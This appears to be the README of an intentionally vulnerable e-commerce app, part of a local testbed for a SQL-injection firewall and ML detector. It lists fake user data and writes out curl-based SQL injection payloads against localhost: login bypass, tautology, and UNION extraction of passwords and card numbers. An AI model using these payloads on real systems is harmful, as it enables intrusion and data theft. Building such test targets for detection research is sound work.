# Target Module - Vulnerable E-Shop Application

Author: Team (for testing)

## Purpose

This is an INTENTIONALLY VULNERABLE web application that simulates a real e-commerce system. It allows demonstration of:
- SQL Injection attacks working against a real database
- Data extraction (usernames, passwords, credit cards)
- The difference between detected attacks and successful attacks

## Database Structure

```
shop.db (SQLite)
    |
    +-- users
    |   |-- id
    |   |-- username
    |   |-- password      <-- Sensitive
    |   |-- email
    |   |-- credit_card   <-- Sensitive
    |   |-- role
    |
    +-- products
    |   |-- id
    |   |-- name
    |   |-- price
    |   |-- stock
    |
    +-- orders
        |-- id
        |-- user_id
        |-- product_id
        |-- quantity
        |-- total
```

## Sample Data

| Username | Password | Email | Credit Card | Role |
|----------|----------|-------|-------------|------|
| admin | admin123 | admin@company.com | 4111-1111-1111-1111 | admin |
| john_doe | password123 | john@email.com | 4222-2222-2222-2222 | user |
| jane_smith | qwerty456 | jane@email.com | 4333-3333-3333-3333 | user |

## Vulnerable Endpoints

### POST /login
```bash
# Normal login
curl -X POST http://localhost:5002/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'

# Attack: Login bypass
curl -X POST http://localhost:5002/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "anything"}'

# Attack: Extract all users
curl -X POST http://localhost:5002/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR '\''1'\''='\''1", "password": "'\'' OR '\''1'\''='\''1"}'
```

### GET /search
```bash
# Normal search
curl "http://localhost:5002/search?q=laptop"

# Attack: UNION-based data extraction
curl "http://localhost:5002/search?q=' UNION SELECT username,password,email,credit_card,role FROM users--"
```

### GET /user/<id>
```bash
# Normal profile
curl "http://localhost:5002/user/1"

# Attack: Get all users
curl "http://localhost:5002/user/1 OR 1=1"
```

## How To Run

```bash
cd src/target
py target.py
```

Runs on: localhost:5002

## Complete Test Flow

```
Terminal 1: py target.py      (port 5002 - vulnerable app)
Terminal 2: py firewall.py    (port 5001 - pre-filter)
Terminal 3: py detector.py    (port 5000 - ML detection)
Terminal 4: py attacker.py    (attacks through firewall)
```

## What Success Looks Like

When an attack BYPASSES detection and reaches the vulnerable app:

```json
{
  "success": true,
  "message": "Login successful",
  "data": [
    {"id": 1, "username": "admin", "email": "admin@company.com", "role": "admin"},
    {"id": 2, "username": "john_doe", "email": "john@email.com", "role": "user"}
  ],
  "query_executed": "SELECT * FROM users WHERE username='' OR '1'='1' AND password=''"
}
```

This proves:
1. The attack successfully bypassed the firewall
2. The SQLi payload was executed on the database
3. Real user data was extracted

## Security Notice

This application is for EDUCATIONAL PURPOSES ONLY.
Never deploy vulnerable code in production environments.
